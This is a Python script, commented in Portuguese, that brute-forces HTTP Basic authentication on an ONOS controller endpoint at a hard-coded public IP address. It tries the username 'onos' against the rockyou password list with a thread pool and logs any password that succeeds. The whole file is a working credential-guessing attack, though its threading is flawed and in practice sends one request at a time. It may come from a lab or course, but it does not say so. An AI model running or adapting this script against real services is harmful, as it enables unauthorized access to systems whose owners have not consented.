import base64
import requests
from concurrent.futures import ThreadPoolExecutor
import logging 

logging.basicConfig(
            filename="02_brute_force_multithread_results.log",  # Arquivo onde os logs serão armazenados
            level=logging.INFO,                   # Nível de log (INFO para capturar mensagens de sucesso e erro)
            format="%(asctime)s - %(levelname)s - %(message)s", 
            datefmt="%Y-%m-%d %H:%M:%S", # Formato do log
)


# URL do serviço alvo que será acessado.
url = "http://34.139.11.27:8181/onos/v1/docs/index.html"

# Nome de usuário usado para a autenticação.
username = "onos" 

# Caminho para o arquivo contendo a lista de senhas.
wordlist_path = 'wordlists/rockyou.txt'

# Número de threads usadas para tentar senhas simultaneamente.
num_threads = 100

# Função para codificar credenciais em formato Base64.
def encode_credentials(username: str, password: str):
    # Concatena o nome de usuário e a senha no formato "username:password".
    credentials = f"{username}:{password}"
    # Codifica as credenciais no formato Base64.
    return base64.b64encode(credentials.encode('ISO-8859-1')).decode("ISO-8859-1")

# Função que tenta verificar uma senha específica.
def try_password(password: str):
    # Remove espaços ou quebras de linha da senha.
    password = password.strip()
    # Codifica as credenciais no formato Base64.
    encoded_credentials = encode_credentials(username, password)
    # Define os cabeçalhos HTTP para a requisição.
    headers = {
        "Authorization": f'Basic {encoded_credentials}',  # Autenticação básica.
        "User-Agent": "Mozilla/5.0",  # Simula um navegador comum.
    }

    try:
        # Envia uma requisição GET para a URL com as credenciais no cabeçalho.
        response = requests.get(url, headers=headers)
        # raise ValueError('error')
        # Verifica se o status da resposta é 200 (autenticação bem-sucedida).
        if response.status_code == 200:
            successString = f"[SUCCESS] Senha encontrada: {password}"
            print(successString)
            logging.info(successString)  # Senha encontrada.
            return True  # Retorna sucesso.
        else:
            print(f"[FAILED] Tentativa falhou com senha: '{password}'")  # Tentativa falhou.
    except Exception as e:
        # Captura e exibe qualquer erro que ocorra durante a requisição.
        logging.basicConfig(
            filename="02_brute_force_multithread_results.log",  # Arquivo onde os logs serão armazenados
            level=logging.ERROR,                   # Nível de log (INFO para capturar mensagens de sucesso e erro)
            format="%(asctime)s - %(levelname)s - %(message)s", 
            datefmt="%Y-%m-%d %H:%M:%S", # Formato do log
        )

        print(f"[ERROR] Erro com senha '{password}': {e}")
        logging.error(e)
    return False  # Retorna falha.

# Função principal para gerenciar o processo de força bruta.
def main():
    # Abre o arquivo de lista de senhas no modo de leitura.
    with open(wordlist_path, 'r', encoding='ISO-8859-1') as wordlist:
        # Itera por cada senha na lista.
        for password in wordlist:
            # Cria um pool de threads com o número máximo definido.
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                # Cria tarefas para testar a senha atual.
                future_to_password = {executor.submit(try_password, password)}

                # Itera sobre os resultados das tarefas.
                for future in future_to_password:
                    if future.result():  # Se a senha foi encontrada, interrompe as threads.
                        print('[INFO] Parando Threads')
                        executor.shutdown(wait=False)  # Encerra as threads imediatamente.
                        break

# Ponto de entrada do programa.
if __name__ == "__main__":
    main()
